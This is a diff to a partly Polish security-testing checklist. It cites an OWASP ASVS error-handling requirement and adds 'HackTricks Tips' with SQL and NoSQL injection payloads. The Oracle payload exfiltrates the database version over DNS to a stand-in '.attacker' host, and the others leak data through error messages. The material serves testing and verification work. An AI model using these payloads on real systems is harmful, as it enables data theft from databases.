@@ -246,3 +246,12 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V16.5.4 | Error Handling | Verify that a "last resort" error handler is defined which will catch all unhandled exceptions. This is both to avoid losing error details that must go to log files and to ensure that an error does not take down the entire application process, leading to a loss of availability. |
+
+
+---
+
+## HackTricks Tips
+
+- **Error-based data exfil** (MSSQL): `1'+user_name(@@version)--` → type mismatch error leaks value
+- **JSON error exfil** (MongoDB `$where`): `throw new Error(JSON.stringify(this))` → full document w error
+- **Oracle DNS OOB via error**: `DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker',80)` — error = port closed, session = open
